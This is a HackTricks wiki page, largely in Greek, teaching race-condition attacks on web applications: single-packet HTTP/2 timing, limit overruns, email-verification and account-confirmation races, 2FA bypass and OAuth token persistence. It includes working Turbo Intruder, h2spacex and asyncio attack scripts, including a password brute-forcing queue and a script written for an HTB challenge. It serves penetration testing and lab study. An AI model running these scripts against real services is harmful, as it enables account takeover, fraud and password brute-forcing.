# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> Για να αποκτήσετε βαθύτερη κατανόηση αυτής της τεχνικής, δείτε την πρωτότυπη έκθεση στο [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## Enhancing Race Condition Attacks

Το κύριο εμπόδιο στην εκμετάλλευση των race conditions είναι η διασφάλιση ότι πολλά αιτήματα θα χειριστούν ταυτόχρονα, με **ελάχιστη διαφορά στους χρόνους επεξεργασίας τους—ιδανικά λιγότερο από 1ms**.

Εδώ θα βρείτε μερικές τεχνικές για τον συγχρονισμό αιτημάτων:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: Υποστηρίζει την αποστολή δύο αιτημάτων πάνω από μία TCP σύνδεση, μειώνοντας την επίδραση του network jitter. Ωστόσο, λόγω διαφορών στο server-side, δύο αιτήματα μπορεί να μην αρκούν για μια συνεπή race condition εκμετάλλευση.
- **HTTP/1.1 'Last-Byte Sync'**: Επιτρέπει την προ-αποστολή των περισσότερων μερών 20-30 αιτημάτων, κρατώντας ένα μικρό κομμάτι, το οποίο αποστέλλεται μαζί, επιτυγχάνοντας ταυτόχρονη άφιξη στον server.

Η προετοιμασία για το Last-Byte Sync περιλαμβάνει:

1. Αποστολή headers και body minus το τελικό byte χωρίς να κλείσετε το stream.
2. Παύση για 100ms μετά την αρχική αποστολή.
3. Απενεργοποίηση του TCP_NODELAY για να χρησιμοποιηθεί ο αλγόριθμος Nagle για batching των τελικών frames.
4. Pinging για «ζέσταμα» της σύνδεσης.

Η επακόλουθη αποστολή των κρατημένων frames θα πρέπει να έχει ως αποτέλεσμα την άφιξή τους σε ένα πακέτο, κάτι που μπορεί να επαληθευτεί με Wireshark. Αυτή η μέθοδος δεν εφαρμόζεται σε static files, τα οποία συνήθως δεν εμπλέκονται σε RC attacks.

### Adapting to Server Architecture

Η κατανόηση της αρχιτεκτονικής του στόχου είναι κρίσιμη. Οι front-end servers μπορεί να δρομολογούν τα αιτήματα διαφορετικά, επηρεάζοντας το timing. Η προληπτική server-side θέρμανση των connections μέσω ασήμαντων αιτημάτων μπορεί να ομαλοποιήσει τους χρόνους απόκρισης.

#### Handling Session-Based Locking

Πλαίσια όπως ο PHP session handler σειριοποιούν τα αιτήματα ανά session, πιθανόν να κρύβουν ευπάθειες. Η χρήση διαφορετικών session tokens για κάθε αίτημα μπορεί να παρακάμψει αυτό το πρόβλημα.

#### Overcoming Rate or Resource Limits

Αν το connection warming δεν αποδίδει, το σκόπιμο δημιουργία καθυστερήσεων στα web servers μέσω πλημμύρας dummy αιτημάτων μπορεί να διευκολύνει το single-packet attack προκαλώντας server-side καθυστέρηση που ευνοεί τις race conditions.

## Attack Examples

- **Tubo Intruder - HTTP2 single-packet attack (1 endpoint)**: Μπορείτε να στείλετε το αίτημα στο Turbo intruder (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), μπορείτε να αλλάξετε στο αίτημα την τιμή που θέλετε να brute force για **`%s`** όπως στο `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` και μετά να επιλέξετε το **`examples/race-single-packer-attack.py`** από το drop down:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

If you are going to **send different values**, you could modify the code with this one that uses a wordlist from the clipboard:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> Αν ο ιστός δεν υποστηρίζει HTTP2 (μόνο HTTP1.1) χρησιμοποιήστε `Engine.THREADED` ή `Engine.BURP` αντί για `Engine.BURP2`.

- **Tubo Intruder - HTTP2 single-packet attack (Several endpoints)**: Σε περίπτωση που χρειάζεται να στείλετε ένα request σε 1 endpoint και στη συνέχεια πολλά σε άλλα endpoints για να ενεργοποιήσετε το RCE, μπορείτε να αλλάξετε το `race-single-packet-attack.py` script με κάτι σαν:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- Είναι επίσης διαθέσιμο στο **Repeater** μέσω της νέας επιλογής '**Send group in parallel**' στο Burp Suite.
- Για **limit-overrun** μπορείτε απλώς να προσθέσετε το **same request 50 times** στην ομάδα.
- Για **connection warming**, μπορείτε να **add** στην **beginning** της **group** μερικές **requests** προς κάποιο μη στατικό μέρος του web server.
- Για **delaying** της διαδικασίας **between** την επεξεργασία **one request and another** σε 2 substates steps, μπορείτε να **add extra requests between** και τα δύο requests.
- Για ένα **multi-endpoint** RC μπορείτε να αρχίσετε να στέλνετε το **request** που **goes to the hidden state** και μετά **50 requests** αμέσως μετά που **exploits the hidden state**.

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automated python script**: Ο στόχος αυτού του script είναι να αλλάξει το email ενός χρήστη ενώ το επαληθεύει συνεχώς μέχρι το verification token του νέου email να φτάσει στο τελευταίο email (αυτό συμβαίνει επειδή στον κώδικα υπήρχε ένα RC όπου ήταν δυνατό να τροποποιηθεί ένα email αλλά η verification να σταλεί στο παλιό επειδή η μεταβλητή που υποδεικνύει το email είχε ήδη γεμίσει με το πρώτο).\
Όταν η λέξη "objetivo" βρεθεί στα ληφθέντα emails, γνωρίζουμε ότι λάβαμε το verification token του τροποποιημένου email και τερματίζουμε την επίθεση.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
### Βελτίωση Single Packet Attack

Στην αρχική έρευνα εξηγείται ότι αυτή η επίθεση έχει όριο 1,500 bytes. Ωστόσο, στο [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/), εξηγήθηκε πώς είναι δυνατό να επεκταθεί ο περιορισμός των 1,500-byte του single packet attack στο **65,535 B window limitation of TCP by using IP layer fragmentation** (διαχωρίζοντας ένα ενιαίο πακέτο σε πολλαπλά IP πακέτα) και να σταλούν με διαφορετική σειρά, επιτρέποντας να αποτραπεί η επανασυγκόλληση του πακέτου μέχρι να φτάσουν όλα τα fragments στον server. Αυτή η τεχνική επέτρεψε στον ερευνητή να στείλει 10,000 requests σε περίπου 166ms.

Σημειώστε ότι παρόλο που αυτή η βελτίωση κάνει την επίθεση πιο αξιόπιστη σε RC που απαιτούν εκατοντάδες/χιλιάδες πακέτα να φτάσουν ταυτόχρονα, μπορεί επίσης να έχει ορισμένους περιορισμούς σε επίπεδο λογισμικού. Ορισμένοι δημοφιλείς HTTP servers όπως οι Apache, Nginx και Go έχουν αυστηρή ρύθμιση `SETTINGS_MAX_CONCURRENT_STREAMS` σε 100, 128 και 250. Ωστόσο, άλλοι όπως οι NodeJS και nghttp2 την έχουν απεριόριστη.\
Αυτό ουσιαστικά σημαίνει ότι ο Apache θα θεωρεί μόνο 100 HTTP connections από μία ενιαία TCP connection (περιορίζοντας αυτή την RC επίθεση).

Μπορείτε να βρείτε κάποια παραδείγματα που χρησιμοποιούν αυτή την τεχνική στο repo [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Raw BF

- **Repeater:** Δείτε τα παραδείγματα από την προηγούμενη ενότητα.
- **Intruder**: Στείλτε το **request** στο **Intruder**, θέστε τον **number of threads** σε **30** μέσα στο **Options menu**, επιλέξτε ως payload **Null payloads** και δημιουργήστε **30**.
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Μεθοδολογία**

### Limit-overrun / TOCTOU

Αυτός είναι ο πιο βασικός τύπος race condition όπου εμφανίζονται **vulnerabilities** σε σημεία που **περιορίζουν τον αριθμό φορών που μπορείτε να εκτελέσετε μια ενέργεια**. Όπως το να χρησιμοποιήσετε τον ίδιο κωδικό έκπτωσης σε ένα web store πολλές φορές. Ένα πολύ απλό παράδειγμα μπορεί να βρεθεί σε [**αυτή την αναφορά**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) ή σε [**αυτό το bug**](https://hackerone.com/reports/759247)**.**

Υπάρχουν πολλές παραλλαγές αυτού του είδους επίθεσης, συμπεριλαμβανομένων:

- Εξαργύρωση gift card πολλαπλές φορές
- Αξιολόγηση προϊόντος πολλαπλές φορές
- Ανάληψη ή μεταφορά μετρητών πέρα από το υπόλοιπο του λογαριασμού
- Επαναχρησιμοποίηση της ίδιας CAPTCHA λύσης
- Παράκαμψη του anti-brute-force rate limit

### **Κρυφές υποκαταστάσεις**

Η εκμετάλλευση πολύπλοκων race conditions συχνά περιλαμβάνει την αξιοποίηση σύντομων ευκαιριών για αλληλεπίδραση με κρυφές ή **ακούσιες υποκαταστάσεις μηχανής**. Να πώς να προσεγγίσετε αυτό:

1. **Εντοπισμός πιθανών κρυφών υποκαταστάσεων**
- Ξεκινήστε εντοπίζοντας endpoints που τροποποιούν ή αλληλεπιδρούν με κρίσιμα δεδομένα, όπως προφίλ χρηστών ή διαδικασίες password reset. Εστιάστε σε:
- **Storage**: Προτιμήστε endpoints που χειρίζονται server-side persistent δεδομένα αντί αυτών που χειρίζονται δεδομένα client-side.
- **Action**: Αναζητήστε λειτουργίες που αλλάζουν υπάρχοντα δεδομένα, οι οποίες είναι πιο πιθανό να δημιουργήσουν εκμεταλλεύσιμες συνθήκες σε σύγκριση με αυτές που προσθέτουν νέα δεδομένα.
- **Keying**: Οι επιτυχημένες επιθέσεις συνήθως περιλαμβάνουν λειτουργίες κλειδωμένες στο ίδιο αναγνωριστικό, π.χ. username ή reset token.
2. **Διεξαγωγή αρχικής διερεύνησης**
- Δοκιμάστε τα εντοπισμένα endpoints με επιθέσεις race condition, παρατηρώντας οποιεσδήποτε αποκλίσεις από τα αναμενόμενα αποτελέσματα. Απρόσμενες απαντήσεις ή αλλαγές στη συμπεριφορά της εφαρμογής μπορούν να υποδείξουν ευπάθεια.
3. **Επιδείξτε την ευπάθεια**
- Περιορίστε την επίθεση στον ελάχιστο αριθμό αιτημάτων που απαιτούνται για να εκμεταλλευτείτε την ευπάθεια, συχνά μόλις δύο. Αυτό το βήμα μπορεί να απαιτήσει πολλαπλές προσπάθειες ή αυτοματοποίηση λόγω της ακριβούς χρονισμού.

### Χρονικά ευαίσθητες επιθέσεις

Η ακρίβεια στον χρονισμό των αιτημάτων μπορεί να αποκαλύψει ευπάθειες, ειδικά όταν χρησιμοποιούνται προβλέψιμοι τρόποι όπως timestamps για security tokens. Για παράδειγμα, η δημιουργία password reset tokens βάσει timestamps θα μπορούσε να επιτρέψει ίδια tokens για ταυτόχρονες αιτήσεις.

**Για να εκμεταλλευτείτε:**

- Χρησιμοποιήστε ακριβή χρονισμό, όπως μια single packet attack, για να κάνετε concurrent password reset requests. Τα ίδια tokens υποδεικνύουν ευπάθεια.

**Παράδειγμα:**

- Αιτηθείτε δύο password reset tokens ταυτόχρονα και συγκρίνετέ τα. Αν τα tokens ταιριάζουν, αυτό υποδηλώνει πρόβλημα στην παραγωγή των token.

Δείτε αυτό [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) για να το δοκιμάσετε.

## Μελέτες περίπτωσης κρυφών υποκαταστάσεων

### Pay & add an Item

Δείτε αυτό [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) για να δείτε πώς να **pay** σε ένα κατάστημα και να **add an extra** αντικείμενο που **δεν θα χρειαστεί να το πληρώσετε**.

### Επιβεβαίωση άλλων διευθύνσεων email

Η ιδέα είναι να **επαληθεύσετε μια διεύθυνση email και να την αλλάξετε σε διαφορετική ταυτόχρονα** για να διαπιστώσετε αν η πλατφόρμα επαληθεύει τη νέα που άλλαξε.

### Change email to 2 emails addresses Cookie based

Σύμφωνα με [**αυτή την έρευνα**](https://portswigger.net/research/smashing-the-state-machine) το Gitlab ήταν ευάλωτο σε takeover με αυτόν τον τρόπο επειδή μπορεί να **στείλει** το **email verification token ενός email στο άλλο email**.

Δείτε αυτό [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) για να το δοκιμάσετε.

### Κρυφές καταστάσεις database / Παράκαμψη Επιβεβαίωσης

Αν **2 διαφορετικές writes** χρησιμοποιούνται για να **προσθέσουν** **πληροφορία** μέσα σε μια **database**, υπάρχει ένα μικρό χρονικό διάστημα όπου **μόνο το πρώτο δεδομένο έχει γραφτεί** στη βάση. Για παράδειγμα, κατά τη δημιουργία χρήστη το **username** και το **password** μπορεί να **γραφτούν** και **μετά το token** για να επιβεβαιωθεί ο νεοδημιουργημένος λογαριασμός να γραφτεί. Αυτό σημαίνει ότι για μικρό χρονικό διάστημα το **token για επιβεβαίωση λογαριασμού είναι null**.

Επομένως, **η εγγραφή ενός λογαριασμού και η αποστολή πολλαπλών αιτημάτων με ένα κενό token** (`token=` ή `token[]=` ή οποιαδήποτε άλλη παραλλαγή) για να επιβεβαιώσετε αμέσως τον λογαριασμό, θα μπορούσε να επιτρέψει να **επιβεβαιώσετε έναν λογαριασμό** όπου δεν ελέγχετε το email.

Δείτε αυτό [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) για να το δοκιμάσετε.

### Παράκαμψη 2FA

Ο ακόλουθος pseudo-code είναι ευάλωτος σε race condition επειδή σε ένα πολύ μικρό χρονικό διάστημα η **2FA δεν εφαρμόζεται** ενώ η session δημιουργείται:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 αιώνια διατήρηση

Υπάρχουν αρκετοί [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). Αυτές οι υπηρεσίες σας επιτρέπουν να δημιουργήσετε μια εφαρμογή και να αυθεντικοποιήσετε χρήστες που έχει καταχωρίσει ο πάροχος. Για να γίνει αυτό, ο **client** θα χρειαστεί να **επιτρέψει στην εφαρμογή σας** να έχει πρόσβαση σε κάποια από τα δεδομένα τους εντός του **OAUth provider**.\
So, until here just a common login with google/linkedin/github... where you are prompted with a page saying: "_Application \<InsertCoolName> wants to access you information, do you want to allow it?_"

#### Race Condition in `authorization_code`

Το **πρόβλημα** εμφανίζεται όταν το **αποδεχτείτε** και αυτόματα στέλνει ένα **`authorization_code`** στην κακόβουλη εφαρμογή. Στη συνέχεια, αυτή η **εφαρμογή καταχράται μια Race Condition στον OAUth service provider για να δημιουργήσει περισσότερα από ένα AT/RT** (_Authentication Token/Refresh Token_) από το **`authorization_code`** για τον λογαριασμό σας. Βασικά, θα εκμεταλλευτεί το γεγονός ότι έχετε δεχτεί την εφαρμογή να έχει πρόσβαση στα δεδομένα σας για να **δημιουργήσει πολλούς λογαριασμούς**. Έπειτα, αν **σταματήσετε να επιτρέπετε στην εφαρμογή να έχει πρόσβαση στα δεδομένα σας ένα ζευγάρι AT/RT θα διαγραφεί, αλλά τα υπόλοιπα θα παραμείνουν έγκυρα**.

#### Race Condition in `Refresh Token`

Μόλις έχετε **αποκτήσει ένα έγκυρο RT** μπορείτε να προσπαθήσετε να **το καταχραστείτε για να δημιουργήσετε πολλά AT/RT** και **ακόμα κι αν ο χρήστης ακυρώσει τα δικαιώματα** για την κακόβουλη εφαρμογή να έχει πρόσβαση στα δεδομένα του, **πολλά RTs θα παραμείνουν έγκυρα.**

## **RC in WebSockets**

- In [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) you can find a PoC in Java to send websocket messages in **parallel** to abuse **Race Conditions also in Web Sockets**.
- With Burp’s WebSocket Turbo Intruder you can use the **THREADED** engine to spawn multiple WS connections and fire payloads in parallel. Start from the official example and tune `config()` (thread count) for concurrency; this is often more reliable than batching on a single connection when racing server‑side state across WS handlers. See [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## Αναφορές

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)

{{#include ../banners/hacktricks-training.md}}
